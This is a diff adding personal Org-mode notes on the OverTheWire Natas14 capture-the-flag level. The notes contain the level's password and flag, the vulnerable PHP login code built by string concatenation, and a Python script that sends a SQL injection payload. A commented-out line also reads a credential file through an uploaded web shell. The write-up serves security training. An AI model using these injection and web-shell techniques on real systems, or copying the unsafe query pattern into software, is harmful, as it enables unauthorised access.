@@ -1,0 +1,133 @@
+:PROPERTIES:
+:ID:       97c8b7c2-a841-41a4-ba77-8a5a045b74cb
+:END:
+#+title: Natas14
+* Previous
+[[id:d803954c-1f3e-4471-b741-0cb738ec73f8][Natas13]]
+
+* Password
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+* Flag
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+* Notes
+
+From top page:
+#+begin_src html
+   <form action="index.php" method="POST">
+    Username:
+    <input name="username"/>
+    Password:
+    <input name="password"/>
+    <input type="submit" value="Login">
+    </input>
+   </form>
+#+end_src
+
+From index-source.html:
+#+begin_src php
+<?
+    if(array_key_exists("username", $_REQUEST)) {
+        $link = mysql_connect('localhost', 'natas14', '<censored>');
+
+        mysql_select_db('natas14', $link);
+
+        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+
+        if(array_key_exists("debug", $_GET)) {
+                echo "Executing query: $query"
+        }
+
+        if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+          echo "Successful login! The password for natas15 is <censored>";
+        } else {
+            echo "Access denied!";
+        }
+
+        mysql_close($link);
+
+    } else {
+
+        ?>
+        <form action="index.php" method="post">
+                    Username:
+        <input name="username">
+                    Password:
+        <input name="password">
+        <input type="submit" value="login" >
+        </input type="submit" value="login" >
+        <? } ?>
+
+      <div id="viewsource">
+      <a href="index-source.html">
+      View sourcecode
+
+      </a href="index-source.html">
+      </div id="viewsource">
+      </input name="password">
+      </input name="username">
+      </form action="index.php" method="post">
+      </censored>
+      </censored>
+      </div id="content">
+      </body>
+      </html>
+      </span>
+      </code>
+#+end_src
+#+begin_src python :results output
+#!/usr/bin/env python3
+
+import requests
+import re
+import html
+from bs4 import BeautifulSoup as bs
+from natas_pass import passwords
+
+session = requests.Session()
+username = "natas14"
+password = passwords[username]
+
+url = "http://{}.natas.labs.overthewire.org/".format(username)
+
+# response = session.get(url, auth=(username, password))
+# response = session.get(url + "index-source.html", auth=(username, password))
+
+response = requests.post(
+    url+"?debug",
+    auth=(username, password),
+    data={'username':'" or username = ANY (SELECT username FROM users); #', "password":""},
+)
+
+raw_content = response.text
+# sourcecode = html.unescape(raw_content)
+# soup = bs(sourcecode, features="html.parser")
+# headers = response.headers
+# print(headers)
+# print(soup.prettify())
+
+# script_path = re.findall("(upload/[a-zA-Z0-9]{10}.php)", raw_content)[0]
+
+# if script_path :
+#     raw_content = requests.get(
+#     url+script_path+"?var=cat /etc/natas_webpass/natas14",
+#     auth=(username, password)
+# ).text
+# else :
+#     print("Error. No path found.")
+
+p = re.findall("([a-zA-Z0-9]{32})", raw_content)
+
+if p and p[0] == password:
+    p.pop(0)
+
+if p :
+    print(p[0])
+#+end_src
+
+#+RESULTS:
+: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+* Next
+[[id:7d44aa7c-68da-4fb0-bbc5-8315c9d85aad][Natas15]]
